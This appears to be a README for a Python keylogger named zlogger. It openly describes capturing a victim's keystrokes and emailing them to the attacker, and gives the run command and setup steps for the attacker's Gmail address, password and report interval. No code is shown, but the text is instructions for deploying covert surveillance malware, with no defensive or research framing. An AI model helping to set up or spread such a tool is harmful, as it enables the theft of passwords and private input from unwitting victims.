A keylogger program is a program that relays information about the victim's keystrokes to the attacker.

usage :
ex) python zlogger.py

****Cautions for using this program***** 
In the zlogger.py code, you need to change the first line: keylogger_instance = keylogger.Keylogger(time,your id,your password).
time : Determines how often you want to receive reports. In this case, time is in seconds, so if it's 2 minutes, you would write 120.

your id: This is the attacker's google email id, which is used to log in because we record and report the results to the attacker's email.

your password: This is the attacker's GOOGLE email PASSWORD that is used to log in, as we will record and report the result to the attacker's email.
